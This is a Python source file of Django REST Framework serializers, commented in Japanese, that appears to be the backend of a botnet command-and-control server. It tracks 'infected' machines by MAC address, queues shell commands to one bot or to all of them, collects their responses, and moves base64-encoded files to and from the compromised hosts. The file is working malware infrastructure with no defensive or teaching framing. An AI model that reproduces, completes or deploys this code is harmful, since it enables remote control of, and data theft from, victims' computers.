import os
import re
import base64
from rest_framework import serializers
from .models import *
from django.conf import settings
from django.utils.crypto import get_random_string
from django.contrib.sites.shortcuts import get_current_site


class ContentValidator:
    def __call__(self, content):
        if re.match('^([A-Za-z0-9+/]{4})*([A-Za-z0-9+/]{3}=|[A-Za-z0-9+/]{2}==)?$', content):
            return content
        raise serializers.ValidationError('base64でエンコードして下さい')


''' 感染者一覧 '''
class BotNetSerializer(serializers.ModelSerializer):
    class Meta:
        model = BotNet
        fields = '__all__'
        extra_kwargs = {
            'finished': {
                'required': False,
                'read_only': True
            }
        }

    def get_instance(self, r):
        return BotNet.objects.get(recipient=r)

    ''' recipientバリデーション '''
    def validate_recipient(self, recipient):
        if re.match('^[0-9a-fA-F]{2}(-[0-9a-fA-F]{2}){5}$', recipient):
            return recipient
        raise serializers.ValidationError('不正なMACアドレスです')



''' 感染者宛て '''
class UpFileSerializer(serializers.ModelSerializer):
    class Meta:
        model = UpFile
        exclude = ('id',)
        extra_kwargs = {
            'content': {'validators': [ContentValidator()]}
        }


''' 送信者宛て '''
class DownFileSerializer(serializers.Serializer):
    name = serializers.CharField(max_length=100)
    content = serializers.CharField(write_only=True, validators=[ContentValidator()])
    link = serializers.CharField(read_only=True)

    def create(self, validated_data):
        name = validated_data['name']
        path = getattr(settings, 'STATICFILES_DIRS', None)[0] + '\\downloads\\'
        #仮
        link = 'http://127.0.0.1:8000/static/downloads/'
        
        def _get(p, n):
            if os.path.isfile(p + n):
                rs = get_random_string()
                ex = re.sub('^.+(\..+)$', "{}\\1".format(rs), n)
                return _get(p, ex)
            else:
                return n
        
        name = _get(path, name)

        with open(path+name, 'wb') as f:
            f.write(base64.b64decode(validated_data['content']))

        df = DownFile(
            name = validated_data['name'],
            link = link + name,
        )
        df.save()
        return df
        

''' コマンド作成用 '''
class CommandSerializer(serializers.ModelSerializer):

    upfile = UpFileSerializer(read_only=True)
    downfile = DownFileSerializer(read_only=True)

    class Meta:
        model = Command
        fields = '__all__'
        extra_kwargs = {
            'response': {'required': False}
        }

    def create(self, validated_data):
        c = Command(
            sender=validated_data['sender'], 
            cmd=validated_data['cmd'],
            recipient=validated_data['recipient']
        )
        c.finished('cmd')
        return c

    def update(self, instance, validated_data):
        instance.response = validated_data.get('response', instance.response)
        instance.finished('resp')
        return instance

    ''' senderバリデーション '''
    def validate_sender(self, sender):
        user = self.context['request'].user
        if sender == user.pk:
            return sender
        raise serializers.ValidationError('自身のユーザIDではありません')

    ''' recipientバリデーション '''
    def validate_recipient(self, recipient):
        if re.match('^[0-9a-fA-F]{2}(-[0-9a-fA-F]{2}){5}$', recipient) or recipient == 'ALL':
            return recipient
        raise serializers.ValidationError('不正なMACアドレスです')


''' PATCH用 '''
class CommandUpdateSerializer(CommandSerializer):

    class Meta:
        model = Command
        fields = '__all__'
        extra_kwargs = {
            'id': {'read_only': True},
            'sender': {'read_only': True},
            'cmd': {'read_only': True},
            'recipient': {'read_only': True},
            'cmd_finished': {'read_only': True},
            'response': {'required': True}
        }


''' 送信者宛て(GET) '''
class SenderSerializer(serializers.ModelSerializer):

    class Meta:
        model = Command
        fields = ('sender',)
        extra_kwargs = {
            'sender': {'write_only': True}
        }

''' 感染者宛て(GET) '''
class RecipientSerializer(serializers.ModelSerializer):

    class Meta:
        model = Command
        fields = ('recipient',)
        extra_kwargs = {
            'recipient': {'write_only': True}
        }